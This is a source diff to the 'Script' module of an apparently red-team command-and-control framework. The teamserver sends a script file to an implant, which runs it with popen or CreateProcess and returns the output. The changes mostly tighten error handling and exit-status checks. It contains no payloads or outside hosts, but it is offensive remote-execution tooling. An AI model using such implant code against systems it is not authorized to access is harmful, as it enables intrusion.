@@ -9,6 +9,10 @@
 #include <sstream>
 #include <string>
 #include <thread>
+#include <utility>
+#ifdef __linux__
+#include <sys/wait.h>
+#endif
 
 #include "Common.hpp"
 
@@ -97,14 +101,14 @@ namespace
         if (!CreatePipe(&pipeRead, &pipeWrite, &securityAttributes, 0))
         {
             errorCode = ERROR_CREATE_PIPE;
-            return "CreatePipe failed.";
+            return {};
         }
         if (!SetHandleInformation(pipeRead, HANDLE_FLAG_INHERIT, 0))
         {
             CloseHandle(pipeRead);
             CloseHandle(pipeWrite);
             errorCode = ERROR_SET_HANDLE_INFO;
-            return "SetHandleInformation failed.";
+            return {};
         }
 
         STARTUPINFOA startupInfo;
@@ -146,7 +150,7 @@ namespace
         {
             CloseHandle(pipeRead);
             errorCode = ERROR_CREATE_PROCESS;
-            return "CreateProcess failed.";
+            return {};
         }
 
         std::array<char, 4096> buffer{};
@@ -156,7 +160,10 @@ namespace
             result.append(buffer.data(), bytesRead);
         }
 
-        WaitForSingleObject(processInfo.hProcess, INFINITE);
+        DWORD exitCode = 0;
+        if (WaitForSingleObject(processInfo.hProcess, INFINITE) != WAIT_OBJECT_0
+            || !GetExitCodeProcess(processInfo.hProcess, &exitCode) || exitCode != 0)
+            errorCode = ERROR_SCRIPT_EXECUTION;
         CloseHandle(processInfo.hThread);
         CloseHandle(processInfo.hProcess);
         CloseHandle(pipeRead);
@@ -197,23 +204,29 @@ std::string Script::getInfo()
 int Script::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
 #if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
-    if(splitedCmd.size()<2)
+    std::vector<std::string> args = regroupStrings(splitedCmd);
+    if(args.size() != 2 || args[0] != moduleName)
     {
         c2Message.set_returnvalue(getInfo());
         return -1;
     }
 
-    string inputFile = splitedCmd[1];
+    string inputFile = args[1];
 
     std::ifstream input(inputFile, std::ios::binary);
 
     if(input.good())
     {
         std::string buffer(std::istreambuf_iterator<char>(input), {});
+        if (input.bad() || buffer.size() > MaxC2BinaryFieldSize)
+        {
+            c2Message.set_returnvalue("Failed to read script artifact.");
+            return -1;
+        }
 
-        c2Message.set_instruction(splitedCmd[0]);
+        c2Message.set_instruction(args[0]);
         c2Message.set_inputfile(inputFile);
-        c2Message.set_data(buffer.data(), buffer.size());
+        c2Message.set_data(std::move(buffer));
     }
     else
     {
@@ -237,27 +250,28 @@ int Script::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 #ifdef __linux__ 
 
-    std::array<char, 128> buffer;
+    std::array<char, 4096> buffer;
 
     std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(script.c_str(), "r"), pclose);
     if (!pipe)
     {
-        result = "popen() failed.";
         errorCode = ERROR_SCRIPT_EXECUTION;
     }
     else
     {
-        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
-        {
-            result += buffer.data();
-        }
+        std::size_t bytesRead = 0;
+        while ((bytesRead = fread(buffer.data(), 1, buffer.size(), pipe.get())) != 0)
+            result.append(buffer.data(), bytesRead);
+        const bool readFailed = ferror(pipe.get()) != 0;
+        const int status = pclose(pipe.release());
+        if (readFailed || status == -1 || !WIFEXITED(status) || WEXITSTATUS(status) != 0)
+            errorCode = ERROR_SCRIPT_EXECUTION;
     }
 
 #elif _WIN32
 
     if (!hasWindowsScriptExtension(c2Message.inputfile()))
     {
-        result = "Unsupported script type on Windows. Use .bat or .cmd.";
         errorCode = ERROR_UNSUPPORTED_SCRIPT_TYPE;
     }
     else
@@ -265,7 +279,6 @@ int Script::process(C2Message &c2Message, C2Message &c2RetMessage)
         const std::string tempScriptPath = makeWindowsTempScriptPath(c2Message.inputfile());
         if (tempScriptPath.empty())
         {
-            result = "Failed to create temporary script path.";
             errorCode = ERROR_TEMP_SCRIPT_PATH;
         }
         else
@@ -275,14 +288,12 @@ int Script::process(C2Message &c2Message, C2Message &c2RetMessage)
                 tempScript.write(script.data(), static_cast<std::streamsize>(script.size()));
                 if (!tempScript.good())
                 {
-                    result = "Failed to write temporary script.";
                     errorCode = ERROR_TEMP_SCRIPT_WRITE;
                 }
             }
 
             if (errorCode == 0 && !std::filesystem::exists(tempScriptPath))
             {
-                result = "Failed to write temporary script.";
                 errorCode = ERROR_TEMP_SCRIPT_WRITE;
             }
             else if (errorCode == 0)
@@ -297,11 +308,8 @@ int Script::process(C2Message &c2Message, C2Message &c2RetMessage)
 #endif
 
     c2RetMessage.set_instruction(c2Message.instruction());
-    if (errorCode > 0)
-    {
-        c2RetMessage.set_errorCode(errorCode);
-    }
-    c2RetMessage.set_returnvalue(result);
+    c2RetMessage.set_errorCode(errorCode);
+    c2RetMessage.set_returnvalue(errorCode == 0 ? result : std::string{});
 
     return 0;
 }
@@ -309,9 +317,32 @@ int Script::process(C2Message &c2Message, C2Message &c2RetMessage)
 int Script::errorCodeToMsg(const C2Message &c2RetMessage, std::string &errorMsg)
 {
 #if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
-    if (c2RetMessage.errorCode() > 0)
+    errorMsg.clear();
+    switch (c2RetMessage.errorCode())
     {
-        errorMsg = c2RetMessage.returnvalue();
+    case ERROR_SCRIPT_EXECUTION:
+        errorMsg = "Script execution failed.";
+        break;
+    case ERROR_UNSUPPORTED_SCRIPT_TYPE:
+        errorMsg = "Unsupported script type on Windows. Use .bat or .cmd.";
+        break;
+    case ERROR_TEMP_SCRIPT_PATH:
+        errorMsg = "Failed to create temporary script path.";
+        break;
+    case ERROR_TEMP_SCRIPT_WRITE:
+        errorMsg = "Failed to write temporary script.";
+        break;
+    case ERROR_CREATE_PIPE:
+        errorMsg = "CreatePipe failed.";
+        break;
+    case ERROR_SET_HANDLE_INFO:
+        errorMsg = "SetHandleInformation failed.";
+        break;
+    case ERROR_CREATE_PROCESS:
+        errorMsg = "CreateProcess failed.";
+        break;
+    default:
+        break;
     }
 #endif
     return 0;
